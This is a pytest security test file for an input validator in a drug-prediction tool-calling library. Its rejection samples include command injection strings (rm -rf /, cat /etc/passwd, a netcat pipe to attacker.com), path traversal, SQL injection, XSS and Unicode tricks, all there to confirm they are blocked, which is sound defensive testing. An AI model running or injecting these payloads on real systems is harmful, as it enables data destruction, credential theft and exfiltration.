"""
Tests for txgemma.validation module.

These are SECURITY-CRITICAL tests that verify input validation prevents:
- Injection attacks (SQL, path traversal, code injection)
- DoS attacks (resource exhaustion)
- Type confusion
- Null byte attacks

All tests should pass to ensure security boundaries are enforced.
"""

import pytest

from txgemma.validation import (
    InputValidator,
    ValidationError,
    validate_tool_call,
)

pytestmark = [pytest.mark.unit, pytest.mark.security]

# =============================================================================
# TOOL NAME VALIDATION
# =============================================================================

class TestValidateToolName:
    """Test tool name validation."""

    def test_valid_simple_name(self):
        """Test that simple valid names pass."""
        result = InputValidator.validate_tool_name("predict_toxicity")
        assert result == "predict_toxicity"

    def test_valid_name_with_numbers(self):
        """Test names with numbers."""
        result = InputValidator.validate_tool_name("CYP2C19")
        assert result == "CYP2C19"

    def test_valid_name_with_hyphen(self):
        """Test names with hyphens."""
        result = InputValidator.validate_tool_name("CYP2C19-Veith")
        assert result == "CYP2C19-Veith"

    def test_valid_name_with_underscore(self):
        """Test names with underscores."""
        result = InputValidator.validate_tool_name("predict_drug_toxicity")
        assert result == "predict_drug_toxicity"

    def test_reject_empty_name(self):
        """Test that empty names are rejected."""
        with pytest.raises(ValidationError, match="cannot be empty"):
            InputValidator.validate_tool_name("")

    def test_reject_non_string(self):
        """Test that non-string types are rejected."""
        with pytest.raises(ValidationError, match="must be string"):
            InputValidator.validate_tool_name(123)

        with pytest.raises(ValidationError, match="must be string"):
            InputValidator.validate_tool_name(None)

    def test_reject_too_long(self):
        """Test that excessively long names are rejected."""
        long_name = "a" * 101  # Max is 100
        with pytest.raises(ValidationError, match="too long"):
            InputValidator.validate_tool_name(long_name)

    def test_reject_path_traversal(self):
        """Test that path traversal attempts are rejected."""
        malicious_names = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "./../../etc/shadow",
        ]
        for name in malicious_names:
            with pytest.raises(ValidationError, match="Invalid tool name"):
                InputValidator.validate_tool_name(name)

    def test_reject_special_characters(self):
        """Test that special characters are rejected."""
        malicious_names = [
            "tool; rm -rf /",
            "tool && cat /etc/passwd",
            "tool | nc attacker.com",
            "tool`whoami`",
            "tool$(whoami)",
            "tool<script>alert(1)</script>",
            "tool' OR '1'='1",
            'tool" OR "1"="1',
        ]
        for name in malicious_names:
            with pytest.raises(ValidationError, match="Invalid tool name"):
                InputValidator.validate_tool_name(name)

    def test_reject_whitespace(self):
        """Test that whitespace is rejected."""
        with pytest.raises(ValidationError, match="Invalid tool name"):
            InputValidator.validate_tool_name("tool name")

        with pytest.raises(ValidationError, match="Invalid tool name"):
            InputValidator.validate_tool_name("tool\tname")

        with pytest.raises(ValidationError, match="Invalid tool name"):
            InputValidator.validate_tool_name("tool\nname")

    def test_reject_null_bytes(self):
        """Test that null bytes are rejected."""
        with pytest.raises(ValidationError, match="Invalid tool name"):
            InputValidator.validate_tool_name("tool\x00name")


# =============================================================================
# PARAMETER NAME VALIDATION
# =============================================================================

class TestValidateParamName:
    """Test parameter name validation."""

    def test_valid_snake_case(self):
        """Test that valid snake_case names pass."""
        result = InputValidator.validate_param_name("drug_smiles")
        assert result == "drug_smiles"

    def test_valid_with_numbers(self):
        """Test snake_case with numbers."""
        result = InputValidator.validate_param_name("param_123")
        assert result == "param_123"

    def test_valid_single_letter(self):
        """Test single letter names."""
        result = InputValidator.validate_param_name("x")
        assert result == "x"

    def test_valid_starts_with_underscore(self):
        """Test names starting with underscore."""
        result = InputValidator.validate_param_name("_private")
        assert result == "_private"

    def test_reject_empty_name(self):
        """Test that empty names are rejected."""
        with pytest.raises(ValidationError, match="cannot be empty"):
            InputValidator.validate_param_name("")

    def test_reject_non_string(self):
        """Test that non-string types are rejected."""
        with pytest.raises(ValidationError, match="must be string"):
            InputValidator.validate_param_name(123)

    def test_reject_too_long(self):
        """Test that excessively long names are rejected."""
        long_name = "a" * 101  # Max is 100
        with pytest.raises(ValidationError, match="too long"):
            InputValidator.validate_param_name(long_name)

    def test_reject_camelcase(self):
        """Test that camelCase is rejected (must be snake_case)."""
        with pytest.raises(ValidationError, match="Must be snake_case"):
            InputValidator.validate_param_name("drugSmiles")

    def test_reject_uppercase(self):
        """Test that uppercase is rejected."""
        with pytest.raises(ValidationError, match="Must be snake_case"):
            InputValidator.validate_param_name("DRUG_SMILES")

    def test_reject_spaces(self):
        """Test that spaces are rejected."""
        with pytest.raises(ValidationError, match="Must be snake_case"):
            InputValidator.validate_param_name("drug smiles")

    def test_reject_hyphens(self):
        """Test that hyphens are rejected (must use underscore)."""
        with pytest.raises(ValidationError, match="Must be snake_case"):
            InputValidator.validate_param_name("drug-smiles")

    def test_reject_starts_with_number(self):
        """Test that names starting with numbers are rejected."""
        with pytest.raises(ValidationError, match="Must be snake_case"):
            InputValidator.validate_param_name("1st_param")

    def test_reject_sql_injection(self):
        """Test that SQL injection attempts are rejected."""
        malicious_names = [
            "param'; DROP TABLE--",
            'param" OR "1"="1',
            "param' OR '1'='1",
        ]
        for name in malicious_names:
            with pytest.raises(ValidationError, match="Must be snake_case"):
                InputValidator.validate_param_name(name)


# =============================================================================
# STRING VALUE VALIDATION
# =============================================================================

class TestValidateStringValue:
    """Test string value validation."""

    def test_valid_smiles_string(self):
        """Test that valid SMILES strings pass."""
        smiles = "CC(=O)OC1=CC=CC=C1C(=O)O"  # Aspirin
        result = InputValidator.validate_string_value(smiles)
        assert result == smiles

    def test_valid_long_smiles(self):
        """Test that long but valid SMILES pass."""
        # 1000 character SMILES
        long_smiles = "C" * 1000
        result = InputValidator.validate_string_value(long_smiles)
        assert result == long_smiles

    def test_valid_protein_sequence(self):
        """Test that protein sequences pass."""
        sequence = "MKTAYIAKQRQISFVKSHFSRQLEERLGLIEVQAPILSRVGDGTQDNLSGAEKAVQVKVKALPDAQFEVVHSLAKWKRQTLGQHDFSAGEGLYTHMKALRPDEDRLSPLHSVYVDQWDWERVMGDGERQFSTLKSTVEAIWAGIKATEAAVSEEFGLAPFLPDQIHFVHSQELLSRYPDLDAKGRERAIAKDLGAVFLVGIGGKLSDGHRHDVRAPDYDDWSTPSELGHAGLNGDILVWNPVLEDAFELSSMGIRVDADTLKHQLALTGDEDRLELEWHQALLRGEMPQTIGGGIGQSRLTMLLLQLPHIGQVQAGVWPAAVRESVPSLL"
        result = InputValidator.validate_string_value(sequence)
        assert result == sequence

    def test_valid_empty_string(self):
        """Test that empty strings are valid (might be optional params)."""
        result = InputValidator.validate_string_value("")
        assert result == ""

    def test_reject_non_string(self):
        """Test that non-string types are rejected."""
        with pytest.raises(ValidationError, match="must be string"):
            InputValidator.validate_string_value(123)

        with pytest.raises(ValidationError, match="must be string"):
            InputValidator.validate_string_value(None)

    def test_reject_too_long(self):
        """Test that excessively long strings are rejected (DoS prevention)."""
        # Max is 50000 characters (~50KB)
        too_long = "A" * 50001
        with pytest.raises(ValidationError, match="too long"):
            InputValidator.validate_string_value(too_long)

    def test_reject_null_bytes(self):
        """Test that null bytes are rejected."""
        with pytest.raises(ValidationError, match="contains null bytes"):
            InputValidator.validate_string_value("valid\x00malicious")

    def test_max_length_boundary(self):
        """Test exactly at max length boundary."""
        # Exactly at max (50000) should pass
        at_max = "A" * 50000
        result = InputValidator.validate_string_value(at_max)
        assert len(result) == 50000

    def test_custom_param_name_in_error(self):
        """Test that parameter name appears in error messages."""
        with pytest.raises(ValidationError, match="'my_param' too long"):
            InputValidator.validate_string_value("A" * 50001, "my_param")


# =============================================================================
# ARGUMENTS VALIDATION
# =============================================================================

class TestValidateArguments:
    """Test arguments dictionary validation."""

    def test_valid_single_string_param(self):
        """Test single string parameter."""
        args = {"drug_smiles": "CCO"}
        result = InputValidator.validate_arguments(args)
        assert result == args

    def test_valid_multiple_params(self):
        """Test multiple parameters of different types."""
        args = {
            "drug_smiles": "CC(=O)OC1=CC=CC=C1C(=O)O",
            "count": 5,
            "concentration": 10.5,
            "is_active": True,
        }
        result = InputValidator.validate_arguments(args)
        assert result == args

    def test_valid_none_value(self):
        """Test that None values are valid (optional params)."""
        args = {"drug_smiles": "CCO", "optional_param": None}
        result = InputValidator.validate_arguments(args)
        assert result == args

    def test_valid_empty_dict(self):
        """Test that empty arguments dict is valid."""
        result = InputValidator.validate_arguments({})
        assert result == {}

    def test_reject_non_dict(self):
        """Test that non-dict types are rejected."""
        with pytest.raises(ValidationError, match="must be dict"):
            InputValidator.validate_arguments([])

        with pytest.raises(ValidationError, match="must be dict"):
            InputValidator.validate_arguments("not a dict")

    def test_reject_too_many_params(self):
        """Test that too many parameters are rejected (DoS prevention)."""
        # Max is 10 parameters
        too_many = {f"param_{i}": i for i in range(11)}
        with pytest.raises(ValidationError, match="Too many parameters"):
            InputValidator.validate_arguments(too_many)

    def test_max_params_boundary(self):
        """Test exactly at max params boundary."""
        # Exactly 10 should pass
        at_max = {f"param_{i}": i for i in range(10)}
        result = InputValidator.validate_arguments(at_max)
        assert len(result) == 10

    def test_reject_invalid_param_names(self):
        """Test that invalid parameter names are rejected."""
        with pytest.raises(ValidationError, match="Must be snake_case"):
            InputValidator.validate_arguments({"BadName": "value"})

    def test_reject_unsupported_types(self):
        """Test that unsupported value types are rejected."""
        with pytest.raises(ValidationError, match="unsupported type"):
            InputValidator.validate_arguments({"param": ["list", "not", "supported"]})

        with pytest.raises(ValidationError, match="unsupported type"):
            InputValidator.validate_arguments({"param": {"nested": "dict"}})

    def test_validate_string_values(self):
        """Test that string values are validated."""
        # Null byte in string value
        with pytest.raises(ValidationError, match="contains null bytes"):
            InputValidator.validate_arguments({"param": "bad\x00value"})

    def test_all_value_types(self):
        """Test all supported value types."""
        args = {
            "string_param": "test",
            "int_param": 42,
            "float_param": 3.14,
            "bool_param": True,
            "none_param": None,
        }
        result = InputValidator.validate_arguments(args)
        assert result == args


# =============================================================================
# TOOL CALL VALIDATION
# =============================================================================

class TestValidateToolCall:
    """Test complete tool call validation."""

    def test_valid_tool_call(self):
        """Test valid complete tool call."""
        tool_name, args = InputValidator.validate_tool_call(
            "predict_toxicity", {"drug_smiles": "CCO"}
        )
        assert tool_name == "predict_toxicity"
        assert args == {"drug_smiles": "CCO"}

    def test_valid_complex_tool_call(self):
        """Test complex tool call with multiple parameters."""
        tool_name, args = InputValidator.validate_tool_call(
            "CYP2C19-Veith",
            {
                "drug_smiles": "CC(=O)OC1=CC=CC=C1C(=O)O",
                "target_sequence": "MKTAYIAK",
                "dose": 100.5,
            },
        )
        assert tool_name == "CYP2C19-Veith"
        assert len(args) == 3

    def test_reject_invalid_tool_name(self):
        """Test that invalid tool names are rejected."""
        with pytest.raises(ValidationError):
            InputValidator.validate_tool_call("invalid; tool", {})

    def test_reject_invalid_arguments(self):
        """Test that invalid arguments are rejected."""
        with pytest.raises(ValidationError):
            InputValidator.validate_tool_call("valid_tool", "not a dict")

    def test_logging_on_success(self):
        """Test that successful validation is logged."""
        # This would require mocking logger, just verify it doesn't crash
        InputValidator.validate_tool_call("tool", {"param": "value"})

    def test_logging_on_failure(self):
        """Test that failed validation is logged."""
        # This would require mocking logger, just verify exception is raised
        with pytest.raises(ValidationError):
            InputValidator.validate_tool_call("", {})


# =============================================================================
# CONVENIENCE FUNCTION
# =============================================================================

class TestValidateToolCallFunction:
    """Test the convenience wrapper function."""

    def test_wrapper_delegates_to_class(self):
        """Test that wrapper function delegates to InputValidator."""
        tool_name, args = validate_tool_call("predict_toxicity", {"drug_smiles": "CCO"})
        assert tool_name == "predict_toxicity"
        assert args == {"drug_smiles": "CCO"}

    def test_wrapper_raises_same_errors(self):
        """Test that wrapper raises same ValidationError."""
        with pytest.raises(ValidationError):
            validate_tool_call("invalid; tool", {})


# =============================================================================
# SECURITY ATTACK VECTORS
# =============================================================================

class TestSecurityAttackVectors:
    """Test protection against real-world attack vectors."""

    def test_reject_sql_injection_in_tool_name(self):
        """Test SQL injection attempts in tool name."""
        attacks = [
            "tool'; DROP TABLE users--",
            'tool" OR "1"="1',
            "tool' OR '1'='1",
            "tool'; DELETE FROM tools WHERE '1'='1",
        ]
        for attack in attacks:
            with pytest.raises(ValidationError):
                InputValidator.validate_tool_name(attack)

    def test_reject_command_injection_in_tool_name(self):
        """Test command injection attempts in tool name."""
        attacks = [
            "tool; rm -rf /",
            "tool && cat /etc/passwd",
            "tool | nc attacker.com 1234",
            "tool`whoami`",
            "tool$(whoami)",
        ]
        for attack in attacks:
            with pytest.raises(ValidationError):
                InputValidator.validate_tool_name(attack)

    def test_reject_path_traversal_in_tool_name(self):
        """Test path traversal attempts in tool name."""
        attacks = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "./../../etc/shadow",
            "....//....//....//etc/passwd",
        ]
        for attack in attacks:
            with pytest.raises(ValidationError):
                InputValidator.validate_tool_name(attack)

    def test_reject_xss_in_tool_name(self):
        """Test XSS attempts in tool name."""
        attacks = [
            "tool<script>alert(1)</script>",
            "tool<img src=x onerror=alert(1)>",
            "tool<svg onload=alert(1)>",
        ]
        for attack in attacks:
            with pytest.raises(ValidationError):
                InputValidator.validate_tool_name(attack)

    def test_reject_null_byte_injection(self):
        """Test null byte injection in various places."""
        # Tool name
        with pytest.raises(ValidationError):
            InputValidator.validate_tool_name("tool\x00malicious")

        # String value
        with pytest.raises(ValidationError):
            InputValidator.validate_string_value("value\x00malicious")

    def test_reject_dos_via_large_inputs(self):
        """Test DoS prevention via input size limits."""
        # Tool name too long
        with pytest.raises(ValidationError, match="too long"):
            InputValidator.validate_tool_name("a" * 101)

        # String value too long
        with pytest.raises(ValidationError, match="too long"):
            InputValidator.validate_string_value("a" * 50001)

        # Too many parameters
        with pytest.raises(ValidationError, match="Too many"):
            InputValidator.validate_arguments({f"p{i}": i for i in range(11)})

    def test_reject_unicode_exploits(self):
        """Test handling of unicode edge cases."""
        # Right-to-left override characters
        rtl_attack = "tool\u202e"  # RLO character
        with pytest.raises(ValidationError):
            InputValidator.validate_tool_name(rtl_attack)

        # Zero-width characters
        zw_attack = "tool\u200b"  # Zero-width space
        with pytest.raises(ValidationError):
            InputValidator.validate_tool_name(zw_attack)


# =============================================================================
# BOUNDARY TESTS
# =============================================================================

class TestBoundaryConditions:
    """Test boundary conditions and edge cases."""

    def test_tool_name_at_max_length(self):
        """Test tool name exactly at maximum length."""
        at_max = "a" * 100  # Exactly at MAX_TOOL_NAME_LENGTH
        result = InputValidator.validate_tool_name(at_max)
        assert len(result) == 100

    def test_param_name_at_max_length(self):
        """Test parameter name exactly at maximum length."""
        at_max = "a" * 100  # Exactly at MAX_PARAM_NAME_LENGTH
        result = InputValidator.validate_param_name(at_max)
        assert len(result) == 100

    def test_string_value_at_max_length(self):
        """Test string value exactly at maximum length."""
        at_max = "A" * 50000  # Exactly at MAX_STRING_VALUE_LENGTH
        result = InputValidator.validate_string_value(at_max)
        assert len(result) == 50000

    def test_arguments_at_max_params(self):
        """Test arguments dict exactly at maximum parameters."""
        at_max = {f"param_{i}": i for i in range(10)}  # Exactly MAX_TOTAL_PARAMS
        result = InputValidator.validate_arguments(at_max)
        assert len(result) == 10


# =============================================================================
# ERROR MESSAGE TESTS
# =============================================================================

class TestErrorMessages:
    """Test that error messages are informative."""

    def test_tool_name_error_includes_value(self):
        """Test that tool name errors include the problematic value."""
        with pytest.raises(ValidationError, match="invalid; tool"):
            InputValidator.validate_tool_name("invalid; tool")

    def test_param_name_error_includes_value(self):
        """Test that parameter name errors include the problematic value."""
        with pytest.raises(ValidationError, match="Bad-Name"):
            InputValidator.validate_param_name("Bad-Name")

    def test_string_value_error_includes_param_name(self):
        """Test that string value errors include parameter name."""
        with pytest.raises(ValidationError, match="'my_param'"):
            InputValidator.validate_string_value("A" * 50001, "my_param")

    def test_type_error_includes_actual_type(self):
        """Test that type errors include the actual type received."""
        with pytest.raises(ValidationError, match="<class 'int'>"):
            InputValidator.validate_tool_name(123)